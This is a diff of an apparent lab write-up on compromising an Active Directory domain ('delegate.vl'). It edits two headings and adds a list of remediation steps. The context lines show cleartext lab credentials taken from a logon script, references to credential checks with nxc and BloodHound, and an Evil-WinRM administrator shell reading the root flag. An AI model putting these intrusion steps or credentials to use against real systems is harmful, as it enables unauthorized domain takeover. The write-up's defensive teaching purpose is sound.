@@ -180,7 +180,7 @@ if %USERNAME%==A.Briggs net use h: \\fileserver\backups /user:Administrator P4ss
 A set of cleartext credentials was found in a logon script.\
 `A.Briggs:P4ssw0rd1#123`
 
-## a.briggs
+## A.Briggs
 
 I ran `nxc` to verify the credential.
 ```
@@ -203,7 +203,7 @@ distinguishedName: CN=N.Thompson,CN=Users,DC=delegate,DC=vl
 permission: WRITE
 ```
 
-## n.thompson
+## N.Thompson
 
 ### BloodHound
 
@@ -539,3 +539,16 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cat ../desktop/root.txt
 20c3c***************************
 ```
+
+## Remediation
+Short term
+- Disable Guest and anonymous login across SMB and domain.
+- Revoke `SeEnableDelegationPrivilege` from non-administrative users.
+- Remove plaintext credentials from logon scripts.
+
+Medium term
+- Audit and remove users with `GenericWrite` or other powerful ACLs over other accounts unless explicitly required.
+- Set `ms-DS-MachineAccountQuota` to 0, and monitor / require approval processess for machine account creation.
+- Enforce strong password policy for domain accounts.
+- Hardern DNS: restrict who can create/modify records.
+- Disable unnecessary services on Domain Controllers. E.g., print spooler.
